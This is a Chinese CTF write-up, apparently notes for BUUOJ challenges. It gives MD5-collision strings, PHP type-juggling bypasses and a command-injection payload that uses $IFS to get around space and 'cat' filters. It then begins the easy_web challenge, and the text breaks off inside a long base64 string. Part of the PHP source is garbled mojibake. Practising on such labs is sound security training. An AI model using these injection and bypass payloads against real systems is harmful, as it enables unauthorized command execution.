?a=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab
&b=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab
&c=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab
```

三个返回相同的md5值，可以通过其有限计算的特性绕过特定的条件。

```
ea8b4156874b91a4ef00c5ca3e4a4a34
ea8b4156874b91a4ef00c5ca3e4a4a34
ea8b4156874b91a4ef00c5ca3e4a4a34
```

### 3. 复现

进来没有什么头绪，访问`robots.txt`可以看到提示；一开始使用`dirsearch`没有扫出来，以后还是得自己试试

<img src="CTF.assets/image-20231124225242950.png" alt="image-20231124225242950" style="zoom:67%;" />

访问`/fAke_f1agggg.php`文件，观察HTTP相应头

![image-20231124230751396](CTF.assets/image-20231124230751396.png)

这里我一开始也没看到，在头部这里也给了下一个提示，访问`/fl4g.php`拿到源码

```php
<?php
header('Content-type:text/html;charset=utf-8');
error_reporting(0);
highlight_file(__file__);


//level 1
if (isset($_GET['num'])){
    $num = $_GET['num'];
    if(intval($num) < 2020 && intval($num + 1) > 2021){
        echo "鎴戜笉缁忔剰闂寸湅浜嗙湅鎴戠殑鍔冲姏澹�, 涓嶆槸鎯崇湅鏃堕棿, 鍙槸鎯充笉缁忔剰闂�, 璁╀綘鐭ラ亾鎴戣繃寰楁瘮浣犲ソ.</br>";
    }else{
        die("閲戦挶瑙ｅ喅涓嶄簡绌蜂汉鐨勬湰璐ㄩ棶棰�");
    }
}else{
    die("鍘婚潪娲插惂");
}
//level 2
if (isset($_GET['md5'])){
   $md5=$_GET['md5'];
   if ($md5==md5($md5))
       echo "鎯冲埌杩欎釜CTFer鎷垮埌flag鍚�, 鎰熸縺娑曢浂, 璺戝幓涓滄緶宀�, 鎵句竴瀹堕鍘�, 鎶婂帹甯堣桨鍑哄幓, 鑷繁鐐掍袱涓嬁鎵嬪皬鑿�, 鍊掍竴鏉暎瑁呯櫧閰�, 鑷村瘜鏈夐亾, 鍒灏忔毚.</br>";
   else
       die("鎴戣刀绱у枈鏉ユ垜鐨勯厭鑲夋湅鍙�, 浠栨墦浜嗕釜鐢佃瘽, 鎶婁粬涓€瀹跺畨鎺掑埌浜嗛潪娲�");
}else{
    die("鍘婚潪娲插惂");
}

//get flag
if (isset($_GET['get_flag'])){
    $get_flag = $_GET['get_flag'];
    // 这里不能带空格
    if(!strstr($get_flag," ")){
        // 不能使用cat命令
        $get_flag = str_ireplace("cat", "wctf2020", $get_flag);
        echo "鎯冲埌杩欓噷, 鎴戝厖瀹炶€屾鎱�, 鏈夐挶浜虹殑蹇箰寰€寰€灏辨槸杩欎箞鐨勬湸瀹炴棤鍗�, 涓旀灟鐕�.</br>";
        system($get_flag);
    }else{
        die("蹇埌闈炴床浜�");
    }
}else{
    die("鍘婚潪娲插惂");
}
?>
```

第一关绕过：`$num = '2e5'`，因为在低版本的PHP中：`intval('2e5') = 2`，`intval('2e5' + 1) = 200001`，满足条件；不懂可以去看前面的讲解

第二关绕过：`$md5 = '0e215962017'`，主要是因为`md5('0e215962017') = 0e291242476940776845150308577824`，而对于`var_dump('0e291242476940776845150308577824' == '0e215962017') --> true`，在PHP中对于以数字开头，中间穿插字符的布尔比较，只会比较前面的数字，即：`0`

第三关绕过：观察源码即可知，要绕过空格和命令`cat`，最后得到的payload

```
?num=2e4&md5=0e215962017&get_flag=tail$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag
```

## BUUOJ [安洵杯 2019]easy_web

### 1. 复现

进入页面，可看到三个可疑点：

1. img 选项用的是`base64`编码
2. cmd 选项
3. 查看源码也可以看到一串base64编码

```
http://87e5b7a0-cb99-4ad4-a2b4-17e6277faf04.node4.buuoj.cn:81/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=
```

首先将`img`做两次`base64解码`，得到一串16进制：`3535352e706e67`，再转，得到文件名：`555.png`

查看源码的十六进制编码，注意看是以：`data:image/gif;base64`开头，这让我感觉是data伪协议，`gif`文件，`base64`数据编码

![image-20231125134329876](CTF.assets/image-20231125134329876.png)

使用python做解码还原成功！

```py
import base64
src = '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